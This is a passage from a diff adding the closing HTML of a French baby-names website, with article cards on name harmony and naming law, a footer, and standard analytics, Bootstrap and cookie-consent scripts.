+      ou d’ailleurs (Rohan, Mai-Lan, Uma) ?
+    </p>
+  </div>
+
+  <div class="rubrique col-md-4">
+    <p>
+      <a href="/harmonie"><img src="images/harmonie_des_prenoms.jpg" alt="sonorite prenom" height="125" width="125"></a>
+    </p>
+    <h3 class="rubrique__text">
+      <a class="rubrique__title" href="/harmonie"><p>Comment bien accorder le nom et le prénom ?</p>
+      </a>
+    </h3>
+    <p class="rubrique__text">
+      Quelques conseils pour que le prénom de votre enfant s'accorde bien avec
+      votre nom de famille.
+    </p>
+  </div>
+  <div class="rubrique col-md-4">
+    <p>
+      <a href="/legislation-prenoms"><img src="images/legislation_des_prenoms.jpg" alt="legislation prenoms" height="125" width="125"></a>
+    </p>
+    <h3 class="rubrique__text">
+      <a class="rubrique__title" href="/legislation-prenoms"><p>Que dit la loi sur les prénoms ?</p>
+      </a>
+    </h3>
+
+    <p class="rubrique__text">
+      Fraise a été interdit mais Fraisine, Framboise et Pomme ont été acceptés.
+      Que dit la loi sur les prénoms ?
+    </p>
+  </div>
+</div>
+<div class="spacing"></div>
+
+<script src="js/dropdown.js"></script>
+
+
+    <footer class="footer">
+        <div class="container ">
+            <ul class="nav  justify-content-center">
+                <li class="nav-item">
+                  <a class="nav-link" href="/charte" rel="nofollow">Charte</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/apropos" rel="nofollow">À Propos</a>
+                  </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="https://www.facebook.com/meilleursprenoms">Contact</a>
+                </li>
+              </ul>
+              <div class="copyright justify-content-center">Copyright © 2000-2025 MeilleursPrenoms.com</div>
+        </div>
+
+    </footer>
+  </div>  <!-- close main-->
+
+    <script src="js/jquery-3.5.1.slim.min.js"></script>
+    <script src="js/popper.min.js" crossorigin="anonymous"></script>
+    <script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+    <!-- <script src="js/fetesquery.js"></script> -->
+    <script src="js/searchRedirects.js"></script>
+
+    <script>
+      $(function() {
+        if(location.pathname !== '/'){
+          $('.navbar a[href^="/' + location.pathname.split("/")[1] + '"]').addClass('active');
+        }
+        $('.section__submenu  a[href^="/' + location.pathname.split("/")[1] + "/" + location.pathname.split("/")[2] + '"]').addClass('active');
+        $('.fetes__submenu a[href^="/' + location.pathname.split("/")[1] + "/" + location.pathname.split("/")[2] + '"]').addClass('active');
+
+
+          });
+    </script>
+   <script type="module">
+    import { logEvent } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-analytics.js";
+
+    document.addEventListener("DOMContentLoaded", function () {
+      // Log page view event
+      logEvent(window.analytics, "page_view", {
+        page_path: location.pathname,
+      });
+
+      // Track clicks on the "Nameby" link
+      const namebyLink = document.querySelector('.rubrique_img a');
+      if (namebyLink) {
+        namebyLink.addEventListener("click", function () {
+          logEvent(window.analytics, "nameby_link_click", {
+            page_path: location.pathname,
+            link_url: namebyLink.href,
+          });
+        });
+      }
+
+      const bookLink = document.querySelector('.officialWidget a');
+      if (bookLink) {
+        bookLink.addEventListener("click", function () {
+          logEvent(window.analytics, "official_book_click", {
+            page_path: location.pathname,
+            link_url: bookLink.href,
+          });
+        });
+      }
+    });
+  </script>
+    <script type="module" src="js/cookie-consent.js"></script>
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v67327c56f0bb4ef8b305cae61679db8f1769101564043" data-cf-beacon="{" version":"2024.11.0","token":"b1bd7a1d212c48078a74c4385dd8ba1c","server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
+
+
+</body></html>
